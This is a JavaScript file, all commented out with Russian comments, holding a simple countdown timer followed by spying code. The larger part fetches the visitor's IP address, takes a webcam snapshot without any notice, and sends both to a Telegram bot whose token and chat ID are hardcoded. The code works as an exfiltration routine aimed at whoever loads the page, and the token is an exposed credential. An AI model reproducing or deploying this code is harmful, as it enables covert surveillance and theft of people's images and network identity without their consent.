// function startFortyMinuteTimer() {
//     let timer = 2400; // 40 минут в секундах
//     let display = document.getElementById("p2");
//     let interval = setInterval(() => {
//         if (timer <= 0) {
//             clearInterval(interval);
//             display.textContent = "Timer finished!";
//         } else {
//             timer--;
//             const minutes = Math.floor(timer / 60);
//             const seconds = timer % 60;
//             display.textContent = `${minutes}m ${seconds}s`;
//         }
//     }, 1000);
// }
// startFortyMinuteTimer()


// Функция для получения IP-адреса пользователя
// async function getUserIP() {
//     const response = await fetch('https://api.ipify.org?format=json');
//     const data = await response.json();
//     return data.ip;
// }

// // Функция для захвата изображения с веб-камеры
// async function captureImage() {
//     const video = document.createElement('video');
//     const canvas = document.createElement('canvas');
//     const context = canvas.getContext('2d');

//     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
//     video.srcObject = stream;
//     await new Promise(resolve => video.onloadedmetadata = resolve);
//     video.play();

//     canvas.width = video.videoWidth;
//     canvas.height = video.videoHeight;
//     context.drawImage(video, 0, 0, canvas.width, canvas.height);

//     stream.getTracks().forEach(track => track.stop());
//     return canvas.toDataURL('image/png');
// }

// // Функция для отправки данных в Telegram
// async function sendToTelegram(ip, image) {
//     const botToken = '7634814709:AAElSEd3C758Y9X6XS4sZx84pnE_GeWDK7k';
//     const chatId = '5752970077';
//     const message = `IP Address: ${ip}`;

//     // Отправка сообщения с IP-адресом
//     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json'
//         },
//         body: JSON.stringify({
//             chat_id: chatId,
//             text: message
//         })
//     });

//     // Отправка изображения с веб-камеры
//     const formData = new FormData();
//     formData.append('chat_id', chatId);
//     formData.append('photo', dataURItoBlob(image), 'webcam.png');

//     await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
//         method: 'POST',
//         body: formData
//     });
// }

// // Вспомогательная функция для преобразования dataURI в Blob
// function dataURItoBlob(dataURI) {
//     const byteString = atob(dataURI.split(',')[1]);
//     const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
//     const ab = new ArrayBuffer(byteString.length);
//     const ia = new Uint8Array(ab);
//     for (let i = 0; i < byteString.length; i++) {
//         ia[i] = byteString.charCodeAt(i);
//     }
//     return new Blob([ab], { type: mimeString });
// }

// // Основная функция для выполнения всех действий
// async function main() {
//     const ip = await getUserIP();
//     const image = await captureImage();
//     await sendToTelegram(ip, image);
// }

// // Запуск основной функции
// main();